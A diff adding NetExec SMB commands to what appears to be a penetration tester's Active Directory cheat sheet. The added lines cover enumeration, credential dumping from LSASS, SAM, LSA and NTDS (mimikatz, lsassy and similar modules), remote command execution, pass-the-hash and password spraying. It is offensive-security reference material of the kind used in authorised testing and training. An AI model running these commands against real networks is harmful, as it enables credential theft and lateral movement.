@@ -1378,6 +1378,28 @@ crackmapexec smb 192.168.45.0/24 -u Administrator -H LM:NT --local-auth
 crackmapexec smb 192.168.45.0/24 -u Administrator -H NT
 https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/
 
+nxc smb 10.0.0.0/24 -u domain_user -p Password1# --shares
+	--users
+	--groups
+	--local-groups
+	--sessions
+	--logged-on-users
+	--pass-pol
+	--local-auth
+	-M lsassy, nanodump, mimikatz, procdump
+	--sam
+	--lsa
+	--ntds (vss)
+	-x <cmd-command>
+	-X <powershell-command>
+nxc smb 10.0.0.0/24 -u domain_user -p Password1# -M spider_plus                        (spider for files in all shares)
+nxc smb 10.0.0.174 -u domain_user -p Password1# --sessions
+
+nxc smb 10.0.0.174 -u alex -H <:NTHASH>
+nxc smb 10.0.0.174 -u users.txt -p password1 password2 password3
+nxc smb 10.0.0.174 -u Administrator -H <:NTHASH> --continue-on-success
+
+
 .\CheckCredentials.ps1            (add the credentials in the source code)
 .\Spray-Passwords.ps1 -Pass Password1#       (spray passwords via LDAP)
 .\Spray-Passwords.ps1 -Pass Password1# -Admins
